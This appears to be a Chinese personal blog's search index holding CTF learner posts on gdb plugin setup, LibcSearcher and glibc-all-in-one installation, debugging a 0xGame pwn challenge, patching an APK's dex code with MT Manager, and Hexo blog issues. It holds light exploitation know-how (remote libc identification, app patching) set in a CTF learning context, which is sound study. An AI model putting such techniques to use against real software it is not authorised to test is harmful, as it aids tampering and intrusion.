    <url>/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.7.5</p><p>链接如下：</p><p><a href="https://blog.csdn.net/aoxixi/article/details/90142736">https://blog.csdn.net/aoxixi/article/details/90142736</a></p><p>对应启动命令：</p><p>echo “source ~&#x2F;GdbPlugins&#x2F;peda&#x2F;peda.py” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;gef&#x2F;gef.py” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;gdbinit&#x2F;gdbinit” &gt; ~&#x2F;.gdbinit </p><p>echo “source ~&#x2F;GdbPlugins&#x2F;pwndbg&#x2F;gdbinit.py” &gt; ~&#x2F;.gdbinit</p><p>written in 2024.3.27</p><p>今天在用pwndbg调试的时候发现用不了fmtarg</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545503373-5e3c9f65-a0d7-4b95-88cc-61ad03f8b8aa.png" class="" title="img"><p>在师傅的提醒下发现没装pwngdb</p><p>安装教程很好找</p><p><a href="https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#%E5%AE%89%E8%A3%85pwndbg-pwngdb-%E8%81%94%E5%90%88%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83">https://hgg-bat.github.io/2021/10/04/pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/#%E5%AE%89%E8%A3%85pwndbg-pwngdb-%E8%81%94%E5%90%88%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83</a></p><p>然而这个时候变成了peda插件<img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545652379-1c7edc3f-c6d7-4890-a057-9b927d6b189d.png" class="" title="img"></p><p>显然我不爽</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545638070-e9e6bdb4-90b0-41df-9d76-02738751b58f.png" class="" title="img"><p>于是把peda这行注释掉，再写对pwndbg中gdbinit.py的路径后（原来没有GdbPlugins，这是我自己的路径），发现达到目的了，也就是第四行代码没用</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545436991-0789d3dc-7355-41e5-adb2-33562cc14b2e.png" class="" title="img"><p>还是很感谢成长过程中的各位师傅(❁´◡&#96;❁)</p><img src="/2024/02/12/pwn%E8%B0%83%E8%AF%95%E6%8F%92%E4%BB%B6%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/1711545974939-334d1a9c-10ae-4b8f-8d57-3d61363f671a.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>如何安装libcsearch</title>
    <link href="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/"/>
    <url>/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/</url>
    
    <content type="html"><![CDATA[<p>github上libcsearch只对python2有效，用python3就找不到匹配的libc版本了，网上说的重装或者更新都是针对python2的，由于本机安装pwntools用的是python3且python2已经不维护了，干脆就另寻出路</p><p><a href="https://pypi.org/project/LibcSearcher/#files">https://pypi.org/project/LibcSearcher/#files</a></p><p>从上面的链接中下载libcsearch可满足python3</p><p>然后再去跑脚本，果然可以了</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905062554-b22ce7a6-1d9a-4bf7-972b-b4a57d8cab49.png" class="" title="img"><p>这是远程的libc选择，和本地不一样</p><p>上网查一下发现ubuntu18对应libc2.27，先试一下第三个，成功</p><img src="/2024/02/03/%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85libcsearch/1691905008510-c2cd1f79-d48d-422d-9ae0-659f0d94e1e0.png" class="" title="img"><p>还有个问题是要知道本机的libc版本，我这里是libc6_2.36-4_amd64,这样打本地会快一点，每次打个一两分钟都是常有的事，不用奇怪</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>二进制文件存在但仍有FileNotFoundError</title>
    <link href="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/"/>
    <url>/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/</url>
    
    <content type="html"><![CDATA[<p>桌面明明有vuln这个文件，但是kali仍有FileNotFoundError</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/4BE59ACDFB71F188E62CCF1B8E4A7979.jpg" class="" title="img"><p>问群里的师傅原来是要装glibc-all-in-one</p><p>一开始师傅说要用.&#x2F;libc.so.6查看要安装的libc版本，但本地一直报错</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/7DFD5873CC9E06A971F4766218EB5E2C.jpg" class="" title="img"><p>我google了但是一直没有直接的解决方案，于是在另一位师傅的推荐下看了另一篇文档，用strings libc.so.6 |grep Ubuntu来确定需要安装的libc库 </p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215652930.png" class="" title="image-20240201215652930"><p>直接下载libc出错，于是去官网手动下载</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215612566.png" class="" title="image-20240201215612566"><p>最后按教程配置即可</p><img src="/2024/02/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BD%86%E4%BB%8D%E6%9C%89FileNotFoundError/image-20240201215510938.png" class="" title="image-20240201215510938"><p>参考链接：<a href="https://www.freebuf.com/sectool/366854.html">https://www.freebuf.com/sectool/366854.html</a></p><p><a href="https://blog.csdn.net/weixin_49764009/article/details/124970461">【kali】 glibc-all-in-one安装 （解决version <code>GLIBC_2.34‘ not found）_version </code>glibc_2.34’ not found-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>以一道pwn题学习如何动调</title>
    <link href="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/"/>
    <url>/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>这是0xGame的week2的一道pwn题，题目本身不难，有一个疑问，刚好借此巩固了一下pwn的动调，希望可以有所收获</p><p><strong>目标：去看dword_40e0改变后的值</strong></p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928256892-d5876add-9c6c-48f5-a51b-ec3c4a6ace91.png" class="" title="img"><p>一开始是2，memset赋值为0</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933587412-3d11e82a-c48c-48a4-91c9-c5d8ffea408e.png" class="" title="img"><p><strong>查看内存注意不要加*</strong></p><p>因为是小端序，红色框起来的部分是shopping_cart[0]</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696931566289-5ff15310-4891-45fc-a21c-36b568debc5f.png" class="" title="img"><p>看基址</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696928301743-312c76ab-6eda-4690-beb0-643c5b194883.png" class="" title="img"><p><strong>加偏移后得到真实地址</strong></p><p>在两次scanf之间下断点</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933156497-0828eea7-53fe-441e-8643-1c57ec02a3aa.png" class="" title="img"><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933120221-449859d4-9339-433c-8c6c-2095728035b8.png" class="" title="img"><p>有断点所以会停下来</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933208375-7fd26797-e85b-434c-82a5-444f7d6dc676.png" class="" title="img"><p>单步步过至0x5555555555452(超过544f）</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933320205-b8f8d425-ff15-4ad5-96c4-fb5f81598879.png" class="" title="img"><p>再看内存就发现变了</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933006068-cde05956-be30-4e84-bbb3-8faaab80f643.png" class="" title="img"><p>用w查看内存就可以避免端序问题</p><img src="/2024/01/26/%E4%BB%A5%E4%B8%80%E9%81%93pwn%E9%A2%98%E5%AD%A6%E4%B9%A0%E5%A6%82%E4%BD%95%E5%8A%A8%E8%B0%83/1696933427059-5ce862e5-b191-4be7-9378-2d1622ea0353.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>减少虚拟机内存</title>
    <link href="/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/"/>
    <url>/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.8.16</p><p>我的kali22.04占物理机内存60多个G，也没安装什么大型软件，不知道为什么水涨船高，从40多G到66.6G，去谷歌上搜也没什么好的办法，就自己研究了一下</p><h1 id="克隆原虚拟机"><a href="#克隆原虚拟机" class="headerlink" title="克隆原虚拟机"></a>克隆原虚拟机</h1><p>之前想的克隆应该是一模一样的，但好多了，从原来66.6G直接变成39个G</p><img src="/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/1697605034183-80578df9-810a-40b8-9270-a27794f809e3.png" class="" title="img"><p>不知道之后会不会自动涨内存，先这样再说</p><h1 id="删一些未知的文件"><a href="#删一些未知的文件" class="headerlink" title="删一些未知的文件"></a>删一些未知的文件</h1><p>这是我先克隆一个虚拟机再进行的操作，想着这些未知又占内存的应该没什么用，就手动一个个删了，发现对虚拟机运行真没影响。当然这样有点冒险，慎用</p><img src="/2024/01/23/%E5%87%8F%E5%B0%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%86%85%E5%AD%98/1697604744305-82590b55-8e9f-422a-8b83-f4afa8d56425.png" class="" title="img">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>搭建博客时个人遇到的一些问题</title>
    <link href="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>本文主要是记录一些与时俱进的问题（因为网上的教程大都是三四年前的了）和个人的一些非预期做法</p><h1 id="本地博客映射到github"><a href="#本地博客映射到github" class="headerlink" title="本地博客映射到github"></a>本地博客映射到github</h1><p>执行<code>hexo clean&amp;hexo g -d</code>后会有像下面一样时不时地报错，网上的不是很行，我这里把github名改成和博客名一样就行了</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/1.png" class="" title="image-20240114211559597"><p>目前我的github是这么个页面</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212817973.png" class="" title="image-20240114212817973"><h1 id="统计访问量"><a href="#统计访问量" class="headerlink" title="统计访问量"></a>统计访问量</h1><p>按教程用leancloud统计访问量不知道为什么本地能看到但是远程一直看不到，试了busuanzi发现也差不多</p><img src="/2024/01/14/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E6%97%B6%E4%B8%AA%E4%BA%BA%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/image-20240114212107890.png" class="" title="image-20240114212107890"><h1 id="添加图片"><a href="#添加图片" class="headerlink" title="添加图片"></a>添加图片</h1><p><a href="https://zhuanlan.zhihu.com/p/280758822#:~:text=hexo%E5%8D%9A%E5%AE%A2%E6%98%BE%E7%A4%BAmarkdown%E8%B7%AF%E5%BE%84%E7%9A%84%E5%9B%BE%E7%89%87%201%20%E4%BF%AE%E6%94%B9%20_config.yml%20%E4%B8%AD%E7%9A%84%20post_asset_folder%3A%20true%202,install%20hexo-image-link%20--save%204%20%E4%BF%AE%E6%94%B9md%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%9B%BE%E7%89%87%E8%B7%AF%E5%BE%84%20%21%20%5Blabel%5D%20%28markdown-file-name%2Fimage-name.jpg%29">hexo博客显示markdown路径的图片 - 知乎 (zhihu.com)</a></p><p>我没有用教程给的方法，而是自己找了一个，把图片直接复制到文档里，markdown和博客都能直接看到图片，简洁明了</p><p>总结来说，最后能成功还是满意的，还是要自己多实践，培养独立解决问题的能力</p><p>总的参考教程附上：<a href="https://blog.csdn.net/yaorongke/article/details/119089190">https://blog.csdn.net/yaorongke/article/details/119089190</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简单使用MT管理器</title>
    <link href="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/"/>
    <url>/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>written in 2023&#x2F;10&#x2F;26</p><p>昨天看到0xGame的0x14537a60师傅提到了MT管理器，就去研究了一下</p><p>这是0xGame week3的第三题</p><p>首先把apk文件放到tmp文件夹，因为在原文件没有修改权限</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/1.jpg" class=""><p>随便找一个tmp文件夹放就行</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/2.jpg" class=""><p>去电脑上找到onClick绝对路径</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/3.png" class=""><p>用dex编辑器打开classes.dex,若有多个一般都是最后一个dex</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/4.jpg" class=""><p>找到方法</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/5.jpg" class=""><p>进去看方法，原来是v4，改成v1</p><p>这里为什么这样改呢，我的想法是第十行result-object，还有就是第九行v1,v2和v3在一起出现</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/6.jpg" class=""><p>再重新安装后运行</p><img src="/2024/01/14/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8MT%E7%AE%A1%E7%90%86%E5%99%A8/7.jpg" class=""><p>浅浅学了一下，希望对以后有点帮助</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/01/13/hello-world/"/>
    <url>/2024/01/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
